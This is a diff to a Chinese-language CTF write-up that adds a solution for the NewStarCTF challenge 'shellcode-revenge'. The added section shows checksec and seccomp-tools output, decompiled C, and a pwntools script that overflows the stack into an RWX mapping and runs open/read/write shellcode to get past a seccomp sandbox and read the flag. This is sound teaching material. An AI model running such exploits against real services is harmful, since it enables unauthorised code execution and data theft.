@@ -2942,7 +2942,7 @@ io.interactive()
 
 ### fallw1nd’s gift
 
-先`file ./fallw1nd_gift `查看文件类型，再`checksec --file=./fallw1nd_gift `检查文件保护情况。
+先`file ./fallw1nd_gift `查看文件类型，再`checksec --file=./fallw1nd_gift`检查文件保护情况。
 
 ```bash
 ┌──(tyd㉿kali-linux)-[~/…/pwn/buuctf/NewStarCTF/fallw1nd’s gift]
@@ -3008,7 +3008,7 @@ io.interactive()
 
 ### uint32 and ret
 
-先`file ./uint `查看文件类型，再`checksec --file=./uint `检查文件保护情况。
+先`file ./uint `查看文件类型，再`checksec --file=./uint`检查文件保护情况。
 
 ```bash
 ┌──(tyd㉿kali-linux)-[~/…/pwn/buuctf/NewStarCTF/uint32 and ret]
@@ -3066,7 +3066,7 @@ payload = b'a'*(0x50+0x8)+p64(0x4011be)
 print(hex(len(payload))) # 0x60
 ```
 
-`LODWORD(nbytes) = 48;`只有`0x30`字节，当用户输入的`v2`使得`0x30-v2`的无符号整型数值不小于`0x60`时就能造成栈溢出漏洞，`scanf`中`%u`是以`unsigned int`型读入正数，所以需要将占`4`字节的小端有符号整数`-48`转换成小端无符号整数`4294967248`，这样程序在执行完`LODWORD(nbytes) = nbytes - v2;`后的`(unsigned int)nbytes`数值就能为`0x60`，从而造成栈溢出漏洞。编写`Python`代码可得`flag{0fb641a6-ff72-4932-a281-2a00a91001e5}`。
+`LODWORD(nbytes) = 48;`只有`0x30`字节，当用户输入的`v2`使得`0x30-v2`的无符号整型数值不小于`0x60`时就能造成栈溢出漏洞，`scanf`中`%u`是以`unsigned int`型读入正数，所以需要将占`4`字节的小端有符号整数`-48`转换成小端无符号整数`4294967248`，这样程序在执行完`LODWORD(nbytes) = nbytes - v2;`后的`(unsigned int)nbytes`数值就能为`0x60`，从而造成栈溢出漏洞。编写`Python`代码求解可得`flag{0fb641a6-ff72-4932-a281-2a00a91001e5}`。
 
 ```python
 from pwn import *
@@ -3077,6 +3077,115 @@ n = int.from_bytes((-48).to_bytes(4, 'little', signed=True), 'little', signed=Fa
 io.sendline(str(n))
 payload = b'a'*(0x50+0x8)+p64(0x4011be)
 io.sendlineafter(b'twice\n', payload)
+io.interactive()
+```
+
+------
+
+### shellcode-revenge
+
+先`file ./pwn `查看文件类型，再`checksec --file=./pwn`检查文件保护情况。
+
+```bash
+┌──(tyd㉿kali-linux)-[~/…/pwn/buuctf/NewStarCTF/shellcode-revenge]
+└─$ file ./pwn
+./pwn: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=cbac893326c4db726742a35949dfbfb0fc23e24e, not stripped
+
+┌──(tyd㉿kali-linux)-[~/…/pwn/buuctf/NewStarCTF/shellcode-revenge]
+└─$ checksec --file=./pwn
+[*] '/home/tyd/ctf/pwn/buuctf/NewStarCTF/shellcode-revenge/pwn'
+    Arch:     amd64-64-little
+    RELRO:    Full RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+```
+
+用`IDA Pro 64bit`打开附件`pwn`，按`F5`反汇编源码并查看主函数。
+
+```c
+int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  char v4[40]; // [rsp+0h] [rbp-30h] BYREF
+  void *buf; // [rsp+28h] [rbp-8h]
+
+  init(argc, argv, envp);
+  sandbox();
+  buf = mmap((void *)0x233000, 0x1000uLL, 7, 34, -1, 0LL);
+  puts("Well.Just a little.");
+  read(0, buf, 0x1AuLL);
+  puts("Let's see what u can do this time~");
+  read(0, v4, 0x100uLL);
+  puts("See you!");
+  return 0;
+}
+```
+
+注意到`mmap`函数，映射了一块起始地址为`0x233000`，长度为`0x1000uLL`的内存，`prot = 7`代表映射的内存可读可写可执行。第一个`read`函数往该内存区域写入，第二个`read`函数能造成栈溢出漏洞。如果这题没有开启沙盒的话解题思路很简单，只需要先将`shellcode`写入`buf`中，再利用栈溢出漏洞把返回地址覆盖为shellcode的所在地址。
+
+```c
+void *mmap(void *start,size_t length,int prot,int flags,int fd,off_t offsize);
+/* start：指向欲映射的内存起始地址，通常设为 NULL，代表让系统自动选定地址，映射成功后返回该地址。
+ * length：代表将文件中多大的部分映射到内存。
+ * prot：映射区域的保护方式。可以为以下几种方式的组合：
+         PROT_EXEC 映射区域可被执行
+         PROT_READ 映射区域可被读取
+         PROT_WRITE 映射区域可被写入
+         PROT_NONE 映射区域不能存取
+ * flags：影响映射区域的各种特性。在调用mmap()时必须要指定MAP_SHARED 或MAP_PRIVATE。
+         MAP_FIXED 如果参数start所指的地址无法成功建立映射时，则放弃映射，不对地址做修正。通常不鼓励用此旗标。
+         MAP_SHARED对映射区域的写入数据会复制回文件内，而且允许其他映射该文件的进程共享。
+         MAP_PRIVATE 对映射区域的写入操作会产生一个映射文件的复制，对此区域作的任何修改都不会写回原来的文件内容。
+         MAP_ANONYMOUS建立匿名映射。此时会忽略参数fd，不涉及文件，而且映射区域无法和其他进程共享。
+         MAP_DENYWRITE只允许对映射区域的写入操作，其他对文件直接写入的操作将会被拒绝。
+         MAP_LOCKED 将映射区域锁定住，这表示该区域不会被置换（swap）。
+ * fd：要映射到内存中的文件描述符。如果使用匿名内存映射时，即flags中设置了MAP_ANONYMOUS，fd设为-1。
+       有些系统不支持匿名内存映射，则可以使用fopen打开/dev/zero文件，然后对该文件进行映射，可以同样达到匿名内存映射的效果。
+ * offset：文件映射的偏移量，通常设置为0，代表从文件最前方开始对应，offset必须是分页大小的整数倍。
+ * 若映射成功则返回映射区的内存起始地址，否则返回MAP_FAILED(－1)，错误原因存于errno 中。
+**/
+// mmap(addr, len, prot, flags, fd, offset)
+```
+
+通过`seccomp-tools`可知不能调用系统函数`system`，我们需要利用`orw`来解题。第一个`read`函数只能读入`0x1a`字节，也就是说只能读入一个函数，因此我们可以先构造一个可以读取足够多字节的`read`。`payload = asm(shellcraft.read(0, '0x233014', 0x42))`的长度为`14`字节。接着利用第二个`read`函数构造栈溢出漏洞让程序执行写入到地址`0x233000`中的`read(0, '0x233014', 0x42)`，这样就能读入`orw`中的三个函数：`open`打开`flag`文件，`read`读取`flag`中的文件到`rsp`寄存器中，`write`将`rsp`中`flag`文件内容写入到标准输出中进行输出显示。只要`orw`是紧挨着`read`函数写入的，程序就能顺序执行，并不需要再`ret`跳转。
+
+```bash
+┌──(tyd㉿kali-linux)-[~/…/pwn/buuctf/NewStarCTF/shellcode-revenge]
+└─$ seccomp-tools dump ./pwn      
+ line  CODE  JT   JF      K
+=================================
+ 0000: 0x20 0x00 0x00 0x00000004  A = arch
+ 0001: 0x15 0x00 0x0a 0xc000003e  if (A != ARCH_X86_64) goto 0012
+ 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
+ 0003: 0x35 0x08 0x00 0x40000000  if (A >= 0x40000000) goto 0012
+ 0004: 0x15 0x07 0x00 0x0000009d  if (A == prctl) goto 0012
+ 0005: 0x15 0x06 0x00 0x00000038  if (A == clone) goto 0012
+ 0006: 0x15 0x05 0x00 0x00000039  if (A == fork) goto 0012
+ 0007: 0x15 0x04 0x00 0x0000003a  if (A == vfork) goto 0012
+ 0008: 0x15 0x03 0x00 0x0000003b  if (A == execve) goto 0012
+ 0009: 0x15 0x02 0x00 0x00000065  if (A == ptrace) goto 0012
+ 0010: 0x15 0x01 0x00 0x00000142  if (A == execveat) goto 0012
+ 0011: 0x06 0x00 0x00 0x7fff0000  return ALLOW
+ 0012: 0x06 0x00 0x00 0x00000000  return KILL
+```
+
+编写`Python`代码求解可得`flag{e2b3063c-cead-4d25-8879-4b22ba877e23}`。
+
+```python
+from pwn import *
+
+context(arch='amd64', os='linux', log_level='debug')
+io = remote('node4.buuoj.cn', 29841)
+elf = ELF('./pwn')
+payload = asm(shellcraft.read(0, '0x233014', 0x42)) # len(payload) = 14
+io.sendlineafter(b'Well.Just a little.\n', payload)
+payload = b'a'*(0x30+0x8) + p64(0x233000)
+io.sendlineafter(b"Let's see what u can do this time~\n", payload)
+shellcode = shellcraft.open('flag')
+shellcode += shellcraft.read('rax', 'rsp', 0x100)
+shellcode += shellcraft.write(1, 'rsp', 0x100)
+payload = asm(shellcode)
+io.sendlineafter('See you!\n', payload)
 io.interactive()
 ```
 
